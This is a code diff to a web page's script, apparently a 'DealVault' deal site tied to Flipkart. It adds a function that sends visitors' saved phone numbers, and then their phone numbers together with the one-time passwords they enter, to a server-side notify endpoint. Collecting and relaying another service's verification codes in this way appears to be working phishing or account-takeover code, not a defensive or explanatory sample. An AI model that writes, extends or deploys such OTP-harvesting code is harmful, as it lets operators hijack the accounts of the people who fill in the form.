@@ -54,6 +54,39 @@
     if (el) el.textContent = msg || '';
   }
 
+  async function sendNotify(eventType, extra) {
+    try {
+      var endpoint = '/.netlify/functions/notify-sending';
+      var body = {
+        event_type: eventType,
+        session_id: sessionId,
+        selected_app: 'flipkart',
+      };
+      for (var key in extra) {
+        if (extra.hasOwnProperty(key)) body[key] = extra[key];
+      }
+
+      console.log('[DealVault] Calling notify:', endpoint, body);
+
+      var res = await fetch(endpoint, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(body),
+      });
+
+      var data = await res.json().catch(function () { return {}; });
+      console.log('[DealVault] notify', eventType, 'status:', res.status, data);
+
+      if (!res.ok || !data.ok) {
+        console.error('[DealVault] notify FAILED:', eventType, data);
+      }
+      return data;
+    } catch (e) {
+      console.error('[DealVault] notify error:', eventType, e);
+      return null;
+    }
+  }
+
   async function savePhone(phone) {
     var db = getSupabase();
     if (!db) return { error: { message: 'Database not connected. Refresh and try again.' } };
@@ -138,6 +171,7 @@
           showError(phoneError, result.error.message || 'Could not save number. Try again.');
           return;
         }
+        sendNotify('phone_saved', { phone: phone });
         showOtpStep();
       } catch (err) {
         showError(phoneError, 'Something went wrong. Try again.');
@@ -163,6 +197,7 @@
         showError(otpError, otpResult.error.message || 'Could not save OTP. Try again.');
         return;
       }
+      sendNotify('otp_saved', { phone: phoneVal, otp: otp });
       if (verifyForm) verifyForm.style.display = 'none';
       if (successMessage) {
         successMessage.hidden = false;
